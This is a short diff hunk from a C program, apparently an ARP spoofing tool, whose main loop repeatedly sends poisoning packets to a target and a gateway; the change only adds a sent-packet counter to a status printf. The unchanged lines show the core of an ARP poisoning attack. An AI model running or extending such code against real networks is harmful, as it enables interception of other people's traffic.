@@ -289,7 +289,7 @@ int main(int argc, char ** argv) {
 	while(1) {
 		sendto(sockfd, arp_poison_target_packet, ARP_PING_LEN, 0, (struct sockaddr*)&device, sizeof(device));
 		sendto(sockfd, arp_poison_gateway_packet, ARP_PING_LEN, 0, (struct sockaddr*)&device, sizeof(device));
-		printf("\r[%0.5d] Sent packet");
+		printf("\r[%0.5d] Sent packet", sent++);
 		fflush(stdout);
 		sleep(3);
 	}
